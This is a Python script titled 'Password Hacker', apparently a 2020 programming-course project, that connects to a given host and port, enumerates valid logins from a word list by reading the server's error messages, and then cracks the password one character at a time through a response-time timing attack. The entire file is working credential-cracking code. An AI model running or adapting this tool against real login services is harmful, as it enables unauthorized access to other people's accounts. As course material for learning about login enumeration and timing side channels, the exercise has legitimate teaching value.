"""

Password Hacker
Author: Litvin Saveli
Project Time: 24.05.2020 - 31.05.2020

"""
import json
import socket
import argparse
import string
import logging
from datetime import datetime

logging.basicConfig(filename="log.txt", filemode="w", level=logging.DEBUG)


def main_con():
    login = check_login()
    password = check_password("")
    json_form = json.dumps({"login": login, "password": password})
    print(json_form)


def check_login():
    with open("logins.txt", "r") as file:

        for login in file.readlines():
            login = login.strip("\n")
            client_socket.send(json.dumps({"login": login, "password": " "}).encode())

            if json.loads((client_socket.recv(1024).decode()))["result"] == "Wrong password!":
                return login


def check_password(password):
    x = (string.ascii_letters + string.digits)

    for letter in x:

        to_send = json.dumps({"login": check_login(), "password": password + letter})

        client_socket.send(to_send.encode())
        send_time = datetime.now()
        receive = json.loads(client_socket.recv(1024).decode())
        response_time = datetime.now()
        diff = response_time - send_time

        if receive["result"] == "Connection success!":

            password += letter
            return password

        elif diff.microseconds >= 10000:

            password += letter
            return check_password(password)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="help takes arguments in command line")
    parser.add_argument("host", help="host_name", type=str)
    parser.add_argument("port", help="port", type=int)
    args = parser.parse_args()
    with socket.socket() as client_socket:
        client_socket.connect((args.host, args.port))
        main_con()
